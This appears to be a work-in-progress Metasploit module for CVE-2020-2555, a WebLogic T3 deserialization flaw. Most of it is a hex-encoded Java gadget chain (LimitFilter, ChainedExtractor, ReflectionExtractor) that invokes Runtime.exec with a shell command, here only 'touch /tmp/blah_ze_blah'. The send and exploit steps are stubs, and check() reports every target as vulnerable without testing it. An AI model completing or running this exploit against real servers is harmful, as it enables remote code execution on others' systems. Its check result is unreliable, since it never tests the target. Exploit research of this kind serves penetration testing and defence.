##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Weblogic Deserialize BadAttributeValueExpException',
      'Description'    => %q(
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
      [
        'Jang',       # Vuln Discovery
        'Y4er',       # PoC
        'Shelby Pace' # Metasploit Module
      ],
      'References'     =>
        [
          [ 'CVE', '2020-2555' ],
          [ 'URL', 'https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server' ],
          [ 'URL', 'https://github.com/Y4er/CVE-2020-2555' ]
        ],
      'Platform'       => %w{ unix win },
      'Payload'        =>
        {
        },
      'Targets'        =>
        [
          [
            'Windows',
            {
              'Platform' => 'win',
            }
          ],
          [
            'Unix',
            {
              'Platform' => 'unix',
            }
          ],
        ],
      'DisclosureDate' => "2020-01-15",
      'DefaultTarget'  => 0
    ))

    register_options([ Opt::RPORT(7001) ])
  end

  def check
    Exploit::CheckCode::Vulnerable
  end

  def t3_handshake
    # t3 12.2.1\nAS:255
    # \nHL:19\nMS:100000
    # 00\n\n
    shake = '74332031322e322e310a41533a323535'
    shake << '0a484c3a31390a4d533a313030303030'
    shake << '30300a0a'

    sock.put([shake].pack('H*'))
    sleep(1)
    sock.get_once
  end

  def build_payload_obj
    payload_obj = 'aced'                                  # STREAM_MAGIC
    payload_obj << '0005'                                 # STREAM_VERSION
    payload_obj << '7372'                                 # TC_OBJECT, TC_CLASSDESC
    payload_obj << '002e'                                 # Class name length: 46
    payload_obj << '6a617661782e6d616e61'                 # Class name: javax.management.BadAttributeValueExpException
    payload_obj << '67656d656e742e426164'
    payload_obj << '41747472696275746556'
    payload_obj << '616c7565457870457863'
    payload_obj << '657074696f6e'
    payload_obj << 'd4e7daab632d4640'                     # SerialVersionUID
    payload_obj << '020001'                               # Serialization flag, field num = 1
    payload_obj << '4c0003'                               # Field type code: 4c = Object, field name length: 3
    payload_obj << '76616c'                               # Field name: val
    payload_obj << '740012'                               # String, length: 18
    payload_obj << '4c6a6176612f6c616e672f4f626a6563743b' # Ljava/lang/Object;
    payload_obj << '7872'                                 # end block data, TC_CLASSDESC
    payload_obj << '0013'                                 # Class name length: 19
    payload_obj << '6a6176612e6c616e672e'                 # java.lang.Exception
    payload_obj << '457863657074696f6e'
    payload_obj << 'd0fd1f3e1a3b1cc4'                     # SerialVersionUID
    payload_obj << '020000'                               # Serializable, No fields
    payload_obj << '7872'                                 # end block data, TC_CLASSDESC
    payload_obj << '0013'                                 # Class name length: 19
    payload_obj << '6a6176612e6c616e672e'                 # java.lang.Throwable
    payload_obj << '5468726f7761626c65'
    payload_obj << 'd5c635273977b8cb'                     # SerialVersionUID
    payload_obj << '030004'                               # ?, then 4 fields
    payload_obj << '4c0005'                               # Field type: Object, field name length: 5
    payload_obj << '6361757365'                           # Field name: cause
    payload_obj << '740015'                               # String, length: 21
    payload_obj << '4c6a6176612f6c616e67'                 # Ljava/lang/Throwable;
    payload_obj << '2f5468726f7761626c653b'
    payload_obj << '4c000d'                               # Field type: Object, field name length: 13
    payload_obj << '64657461696c4d657373616765'           # Field name: detailMessage
    payload_obj << '740012'                               # String, length: 18
    payload_obj << '4c6a6176612f6c616e67'                 # Ljava/lang/String;
    payload_obj << '2f537472696e673b'
    payload_obj << '5b000a'                               # Field type: 5b = array, field name length: 10
    payload_obj << '737461636b5472616365'                 # Field name: stackTrace
    payload_obj << '74001e'                               # String, length: 30
    payload_obj << '5b4c6a6176612f6c616e'                 # [Ljava/lang/StackTraceElement;
    payload_obj << '672f537461636b547261'
    payload_obj << '6365456c656d656e743b'
    payload_obj << '4c0014'                               # Field type: Object, field name length: 20
    payload_obj << '73757070726573736564'                 # Field name: suppressedExceptions
    payload_obj << '457863657074696f6e73'
    payload_obj << '740010'                               # String, length: 16
    payload_obj << '4c6a6176612f7574696c'                 # Ljava/util/List;
    payload_obj << '2f4c6973743b'
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0008'                             # handle?
    payload_obj << '7075'                                 # TC_NULL, TC_ARRAY
    payload_obj << '72001e'                               # TC_CLASSDESC, Class name length: 30
    payload_obj << '5b4c6a6176612e6c616e'                 # [Ljava.lang.StackTraceElement;
    payload_obj << '672e537461636b547261'
    payload_obj << '6365456c656d656e743b'
    payload_obj << '02462a3c3cfd2239'                     # SerialVersionUID
    payload_obj << '020000'                               # Serializable, No fields
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000001'
    payload_obj << '7372'                                 # TC_OBJECT, TC_CLASSDESC
    payload_obj << '001b'                                 # Class name length: 27
    payload_obj << '6a6176612e6c616e672e'                 # java.lang.StackTraceElement
    payload_obj << '537461636b5472616365'
    payload_obj << '456c656d656e74'
    payload_obj << '6109c59a2636dd85'                     # SerialVersionUID
    payload_obj << '020004'                               # Serializable, 4 fields
    payload_obj << '49000a'                               # Field type: 49 = Integer, field name length: 10
    payload_obj << '6c696e654e756d626572'                 # lineNumber
    payload_obj << '4c000e'                               # Field type: Object, field name length: 14
    payload_obj << '6465636c6172696e6743'
    payload_obj << '6c617373'                             # declaringClass
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0005'                             # handle
    payload_obj << '4c0008'                               # Field type: Object, field name length: 8
    payload_obj << '66696c654e616d65'                     # fileName
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0005'                             # handle
    payload_obj << '4c000a'                               # Field type: Object, field name length: 10
    payload_obj << '6d6574686f644e616d65'                 # methodName
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0005'                             # handle
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000028'
    payload_obj << '74000d'                               # String, length: 13
    payload_obj << '5765626c6f6769635f32353535'           # Weblogic_2555 -> PoC class name -> randomize?
    payload_obj << '740012'                               # String, length: 18
    payload_obj << '5765626c6f6769635f32'                 # Weblogic_2555.java
    payload_obj << '3535352e6a617661'
    payload_obj << '740004'                               # String, length: 4
    payload_obj << '6d61696e'                             # main
    payload_obj << '7372'                                 # TC_OBJECT, TC_CLASSDESC
    payload_obj << '0026'                                 # Class name length: 38
    payload_obj << '6a6176612e7574696c2e'                 # java.util.Collections$UnmodifiableList
    payload_obj << '436f6c6c656374696f6e'
    payload_obj << '7324556e6d6f64696669'
    payload_obj << '61626c654c697374'
    payload_obj << 'fc0f2531b5ec8e10'                     # SerialVersionUID
    payload_obj << '020001'                               # Serializable, 1 field
    payload_obj << '4c0004'                               # Field type: Object, field name length: 4
    payload_obj << '6c697374'                             # list
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0007'                             # handle
    payload_obj << '7872'                                 # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << '002c'                                 # Class name length: 44
    payload_obj << '6a6176612e7574696c2e'                 # java.util.Collections$UnmodifiableCollection
    payload_obj << '436f6c6c656374696f6e'
    payload_obj << '7324556e6d6f64696669'
    payload_obj << '61626c65436f6c6c6563'
    payload_obj << '74696f6e'
    payload_obj << '19420080cb5ef71e'                     # SerialVersionUID
    payload_obj << '020001'                               # Serializable, 1 field
    payload_obj << '4c0001'                               # Field type: Object, field name length: 1
    payload_obj << '63'                                   # Field name: c
    payload_obj << '740016'                               # String, length: 22
    payload_obj << '4c6a6176612f7574696c'                 # Ljava/util/Collection;
    payload_obj << '2f436f6c6c656374696f'
    payload_obj << '6e3b'
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '7372'                                 # TC_OBJECT, TC_CLASSDESC
    payload_obj << '0013'                                 # Class name length: 19
    payload_obj << '6a6176612e7574696c2e'                 # java.util.ArrayList
    payload_obj << '41727261794c697374'
    payload_obj << '7881d21d99c7619d'                     # SerialVersionUID
    payload_obj << '030001'                               # ?, 1 field
    payload_obj << '490004'                               # Field type: Integer, field name length: 4
    payload_obj << '73697a65'                             # size
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000000'
    payload_obj << '7704'                                 # TC_BLOCKDATA, length: 4
    payload_obj << '00000000'
    payload_obj << '7871'                                 # TC_ENDBLOCKDATA, TC_REFERENCE
    payload_obj << '007e0015'                             # handle
    payload_obj << '78'                                   # TC_ENDBLOCKDATA
    payload_obj << '7372'                                 # TC_OBJECT, TC_CLASSDESC
    payload_obj << '0024'                                 # Class name length: 36
    payload_obj << '636f6d2e74616e676f73'                 # com.tangosol.util.filter.LimitFilter
    payload_obj << '6f6c2e7574696c2e6669'
    payload_obj << '6c7465722e4c696d6974'
    payload_obj << '46696c746572'
    payload_obj << '954e4590be89865f'                     # SerialVersionUID
    payload_obj << '020006'                               # Serializable, 6 fields
    payload_obj << '49000b'                               # Field type: Integer, field name length: 11
    payload_obj << '6d5f635061676553697a65'               # m_cPageSize
    payload_obj << '490007'                               # Field type: Integer, field name length: 7
    payload_obj << '6d5f6e50616765'                       # m_nPage
    payload_obj << '4c000c'                               # Field type: Object, field name length: 12
    payload_obj << '6d5f636f6d70617261746f72'             # m_comparator
    payload_obj << '740016'                               # String, length: 22
    payload_obj << '4c6a6176612f7574696c'                 # Ljava/util/Comparator;
    payload_obj << '2f436f6d70617261746f'
    payload_obj << '723b'
    payload_obj << '4c0008'                               # Field type: Object, field name length: 8
    payload_obj << '6d5f66696c746572'                     # m_filter
    payload_obj << '74001a'                               # String, length: 26
    payload_obj << '4c636f6d2f74616e676f'                 # Lcom/tangosol/util/Filter;
    payload_obj << '736f6c2f7574696c2f46'
    payload_obj << '696c7465723b'
    payload_obj << '4c000f'                               # Field type: Object, field name length: 15
    payload_obj << '6d5f6f416e63686f7242'                 # m_oAnchorBottom
    payload_obj << '6f74746f6d'
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0001'                             # handle
    payload_obj << '4c000c'                               # Field type: Object, field name length: 12
    payload_obj << '6d5f6f416e63686f72546f70'             # m_oAnchorTop
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0001'                             # handle
    payload_obj << '7872'                                 # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << '0034'                                 # Class name length: 52
    payload_obj << '636f6d2e74616e676f73'                 # com.tangosol.util.filter.AbstractQueryRecorderFilter
    payload_obj << '6f6c2e7574696c2e6669'
    payload_obj << '6c7465722e4162737472'
    payload_obj << '61637451756572795265'
    payload_obj << '636f7264657246696c74'
    payload_obj << '6572'
    payload_obj << 'f3b98201f680eb90'                     # SerialVersionUID
    payload_obj << '020000'                               # Serializable, no fields
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000000'
    payload_obj << '00000000'
    payload_obj << '7372'                                 # TC_OBJECT, TC_CLASSDESC
    payload_obj << '002c'                                 # Class name length: 44
    payload_obj << '636f6d2e74616e676f73'                 # com.tangosol.util.extractor.ChainedExtractor
    payload_obj << '6f6c2e7574696c2e6578'
    payload_obj << '74726163746f722e4368'
    payload_obj << '61696e65644578747261'
    payload_obj << '63746f72'
    payload_obj << '435b250b72f63db5'                     # SerialVersionUID
    payload_obj << '020000'                               # Serializable, no fields
    payload_obj << '7872'                                 # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << '0036'                                 # Class name length: 54
    payload_obj << '636f6d2e74616e676f73'                 # com.tangosol.util.extractor.AbstractCompositeExtractor
    payload_obj << '6f6c2e7574696c2e6578'
    payload_obj << '74726163746f722e4162'
    payload_obj << '737472616374436f6d70'
    payload_obj << '6f736974654578747261'
    payload_obj << '63746f72'
    payload_obj << '086b3d8c05690f44'                     # SerialVersionUID
    payload_obj << '020001'                               # Serializable, 1 field
    payload_obj << '5b000c'                               # Field type: Array, field name length: 12
    payload_obj << '6d5f61457874726163746f72'             # m_aExtractor
    payload_obj << '740023'                               # String, length: 35
    payload_obj << '5b4c636f6d2f74616e67'                 # [Lcom/tangosol/util/ValueExtractor;
    payload_obj << '6f736f6c2f7574696c2f'
    payload_obj << '56616c75654578747261'
    payload_obj << '63746f723b'
    payload_obj << '7872'                                 # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << '002d'                                 # Class name length: 45
    payload_obj << '636f6d2e74616e676f73'                 # com.tangosol.util.extractor.AbstractExtractor
    payload_obj << '6f6c2e7574696c2e6578'
    payload_obj << '74726163746f722e4162'
    payload_obj << '73747261637445787472'
    payload_obj << '6163746f72'
    payload_obj << '9b1be18ed70100e5'                     # SerialVersionUID
    payload_obj << '020001'                               # Serializable, 1 field
    payload_obj << '490009'                               # Field type: Integer, field name length: 9
    payload_obj << '6d5f6e546172676574'                   # m_nTarget
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000000'
    payload_obj << '7572'                                 # TC_ARRAY, TC_CLASSDESC
    payload_obj << '0032'                                 # Class name length: 50
    payload_obj << '5b4c636f6d2e74616e67'                 # [Lcom.tangosol.util.extractor.ReflectionExtractor;
    payload_obj << '6f736f6c2e7574696c2e'
    payload_obj << '657874726163746f722e'
    payload_obj << '5265666c656374696f6e'
    payload_obj << '457874726163746f723b'
    payload_obj << 'dd8b89aed70273ca'                     # SerialVersionUID
    payload_obj << '020000'                               # Serializable, no fields
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000003'
    payload_obj << '7372'                                 # TC_OBJECT, TC_CLASSDESC
    payload_obj << '002f'                                 # Class name length: 47
    payload_obj << '636f6d2e74616e676f73'                 # com.tangosol.util.extractor.ReflectionExtractor
    payload_obj << '6f6c2e7574696c2e6578'
    payload_obj << '74726163746f722e5265'
    payload_obj << '666c656374696f6e4578'
    payload_obj << '74726163746f72'
    payload_obj << '1f62f564b951b614'                     # SerialVersionUID
    payload_obj << '020002'                               # Serializable, two fields
    payload_obj << '5b0009'                               # Field type: Array, field name length: 9
    payload_obj << '6d5f616f506172616d'                   # m_aoParam
    payload_obj << '740013'                               # String, length: 19
    payload_obj << '5b4c6a6176612f6c616e'                 # [Ljava/lang/Object;
    payload_obj << '672f4f626a6563743b'
    payload_obj << '4c0009'                               # Object, length: 9
    payload_obj << '6d5f734d6574686f64'                   # m_sMethod
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0005'                             # handle
    payload_obj << '7871'                                 # TC_ENDBLOCKDATA, TC_REFERENCE
    payload_obj << '007e001e'                             # handle
    payload_obj << '00000000'
    payload_obj << '7572'                                 # TC_ARRAY, TC_CLASSDESC
    payload_obj << '0013'                                 # Class name length: 19
    payload_obj << '5b4c6a6176612e6c616e'                 # [Ljava.lang.Object;
    payload_obj << '672e4f626a6563743b'
    payload_obj << '90ce589f1073296c'                     # SerialVersionUID
    payload_obj << '020000'                               # Serializable, no fields
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000002'
    payload_obj << '74000a'                               # String, length: 10
    payload_obj << '67657452756e74696d65'                 # getRuntime
    payload_obj << '7572'                                 # TC_ARRAY, TC_CLASSDESC
    payload_obj << '0012'                                 # Class name length: 18
    payload_obj << '5b4c6a6176612e6c616e'                 # [Ljava.lang.Class;
    payload_obj << '672e436c6173733b'
    payload_obj << 'ab16d7aecbcd5a99'                     # SerialVersionUID
    payload_obj << '020000'                               # Serializable, no fields
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000000'
    payload_obj << '740009'                               # String, length: 9
    payload_obj << '6765744d6574686f64'                   # getMethod
    payload_obj << '7371'                                 # TC_OBJECT, TC_REFERENCE
    payload_obj << '007e0022'                             # handle
    payload_obj << '00000000'
    payload_obj << '7571'                                 # TC_ARRAY, TC_REFERENCE
    payload_obj << '007e0025'                             # handle
    payload_obj << '00000002'                             # array size: 2
    payload_obj << '7075'                                 # TC_NULL, TC_ARRAY
    payload_obj << '71'                                   # TC_REFERENCE
    payload_obj << '007e0025'                             # handle
    payload_obj << '00000000'
    payload_obj << '740006'                               # TC_STRING, length: 6
    payload_obj << '696e766f6b65'                         # invoke
    payload_obj << '7371'                                 # TC_OBJECT, TC_REFERENCE
    payload_obj << '007e0022'                             # handle
    payload_obj << '00000000'
    payload_obj << '7571'                                 # TC_ARRAY, TC_REFERENCE
    payload_obj << '007e0025'                             # handle
    payload_obj << '00000001'
    payload_obj << '7572'                                 # TC_ARRAY, TC_CLASSDESC
    payload_obj << '0013'                                 # Class name length: 19
    payload_obj << '5b4c6a6176612e6c616e'                 # [Ljava.lang.String;
    payload_obj << '672e537472696e673b'
    payload_obj << 'add256e7e91d7b47'                     # SerialVersionUID
    payload_obj << '020000'                               # Serializable, no fields
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
    payload_obj << '00000003'
    payload_obj << '740007'                               # String, length: 7
    payload_obj << '2f62696e2f7368'                       # /bin/sh
    payload_obj << '740002'                               # String, length: 2
    payload_obj << '2d63'                                 # -c
    payload_obj << '740017'                               # String, length: 23
    payload_obj << '746f756368202f746d70'                 # touch /tmp/blah_ze_blah
    payload_obj << '2f626c61685f7a655f62'
    payload_obj << '6c6168'
    payload_obj << '740004'                               # String, length: 4
    payload_obj << '65786563'                             # exec
    payload_obj << '7070'                                 # TC_NULL, TC_NULL
    payload_obj << '7672'                                 # TC_CLASS, TC_CLASSDESC
    payload_obj << '0011'                                 # Class name length: 17
    payload_obj << '6a6176612e6c616e672e'                 # java.lang.Runtime
    payload_obj << '52756e74696d65'
    payload_obj << '0000000000000000'
    payload_obj << '000000'
    payload_obj << '7870'                                 # TC_ENDBLOCKDATA, TC_NULL
  end

  def t3_send(payload_obj)
  end

  def exploit
    connect

    output = t3_handshake
  end
end
